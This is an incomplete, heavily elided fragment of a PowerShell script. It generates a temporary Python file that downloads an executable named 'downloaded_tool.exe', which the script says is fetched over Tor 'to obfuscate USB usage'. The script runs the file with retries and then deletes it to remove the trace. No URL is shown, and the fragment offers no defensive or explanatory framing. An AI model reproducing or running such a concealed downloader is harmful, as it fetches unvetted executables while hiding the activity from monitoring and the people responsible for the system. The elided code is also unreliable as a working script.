...
Set-Content -Path .\temp_download_usb.py -Value @"
import requests
import time
...
try:
    ...
    with open("downloaded_tool.exe", "wb") as f:
        f.write(response.content)
    print("File downloaded over Tor to obfuscate USB usage.")
...
for ($attempt = 1; $attempt -le 3; $attempt++) {
    ...
    try {
        $pythonOutput = python temp_download_usb.py 2>&1 | Out-String
        if ($LASTEXITCODE -eq 0) {
            Write-Host $pythonOutput
            Remove-Item temp_download_usb.py
            exit 0
        } else {
